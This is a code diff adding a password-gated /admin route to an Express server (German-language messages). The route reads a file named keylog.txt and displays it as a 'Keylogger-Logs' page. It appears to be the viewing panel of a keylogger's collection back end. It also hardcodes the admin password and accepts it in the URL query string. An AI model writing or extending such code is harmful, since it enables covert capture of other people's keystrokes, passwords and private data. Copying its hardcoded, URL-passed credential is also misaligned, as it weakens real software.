@@ -67,6 +67,37 @@ app.post('/submit', async (req, res) => {
   }
 });
 
+const ADMIN_PASSWORD = "Cryptoking2025!"; 
+
+app.get('/admin', (req, res) => {
+    const auth = req.query.password;
+    if (auth !== ADMIN_PASSWORD) {
+        return res.status(403).send("Zugriff verweigert.");
+    }
+
+    try {
+        const logs = fs.readFileSync(path.join(__dirname, 'private_logs', 'keylog.txt'), 'utf-8');
+        res.send(`
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Admin-Logs</title>
+                <style>
+                    body { font-family: Arial; padding: 20px; }
+                    pre { background: #111; color: #0f0; padding: 10px; border-radius: 5px; }
+                </style>
+            </head>
+            <body>
+                <h1>Keylogger-Logs</h1>
+                <pre>${logs.replace(/</g, "&lt;")}</pre> <!-- XSS-Sicher -->
+            </body>
+            </html>
+        `);
+    } catch (err) {
+        res.send("Keine Logs gefunden.");
+    }
+});
+
 app.listen(PORT, () => {
   console.log(`✅ Server läuft auf http://localhost:${PORT}`);
 });
